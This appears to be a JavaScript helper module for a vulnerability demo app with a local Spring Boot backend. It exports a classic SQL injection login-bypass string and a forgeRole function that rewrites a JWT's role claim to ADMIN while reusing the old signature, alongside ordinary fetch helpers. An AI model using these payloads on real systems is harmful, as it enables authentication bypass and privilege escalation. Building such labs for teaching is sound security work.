export const SQLI_PAYLOAD = "' OR '1'='1 --"

const AUTHORS = {
  1: 'alice',
  2: 'bob',
  3: 'admin'
}

export function authorName(id) {
  return AUTHORS[id] || `usuário ${id}`
}

export async function apiFetch({ version, path, token, method = 'GET', body }) {
  const headers = { Accept: 'application/json' }

  if (body !== undefined) {
    headers['Content-Type'] = 'application/json'
  }

  if (token) {
    headers.Authorization = `Bearer ${token}`
  }

  try {
    const response = await fetch(`/api/${version}${path}`, {
      method,
      headers,
      body: body !== undefined ? JSON.stringify(body) : undefined
    })

    const text = await response.text()
    let data = null

    if (text) {
      try {
        data = JSON.parse(text)
      } catch {
        data = { error: text }
      }
    }

    return { ok: response.ok, status: response.status, data }
  } catch {
    return {
      ok: false,
      status: 0,
      data: { error: 'Sem conexão com o backend. Suba o Spring Boot na porta 8080.' }
    }
  }
}

function encodeBase64Url(text) {
  const bytes = new TextEncoder().encode(text)
  let binary = ''

  bytes.forEach((byte) => {
    binary += String.fromCharCode(byte)
  })

  return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '')
}

function decodeBase64Url(segment) {
  const pad = '='.repeat((4 - (segment.length % 4)) % 4)
  const base64 = segment.replace(/-/g, '+').replace(/_/g, '/') + pad
  const binary = atob(base64)
  const bytes = Uint8Array.from(binary, (char) => char.charCodeAt(0))

  return new TextDecoder().decode(bytes)
}

export function forgeRole(token, role = 'ADMIN') {
  const parts = token.split('.')

  if (parts.length < 2) {
    throw new Error('Token malformado')
  }

  const claims = JSON.parse(decodeBase64Url(parts[1]))
  claims.role = role

  const payload = encodeBase64Url(JSON.stringify(claims))
  const signature = parts[2] || 'assinatura-nao-recalculada'

  return {
    token: `${parts[0]}.${payload}.${signature}`,
    claims
  }
}
